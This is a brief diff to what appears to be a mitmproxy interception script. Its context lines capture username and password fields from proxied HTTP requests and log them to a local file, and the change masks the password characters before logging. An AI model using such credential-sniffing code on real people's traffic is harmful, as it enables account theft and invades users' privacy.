@@ -13,5 +13,6 @@ def response(flow: http.HTTPFlow) -> None:
         data = re.findall(b'(password=[^&]*|username=[^&]*)', flow.request.content)
         if data:
             with open('/tmp/lol.log', 'a') as f:
-                f.write(str(data) + '\n')
+                sanitized = re.sub("(word=\w).*?(\w)'", '\\1' + '*' * random.randint(5, 10) + '\\2', str(data))
+                f.write(str(sanitized) + '\n')
 
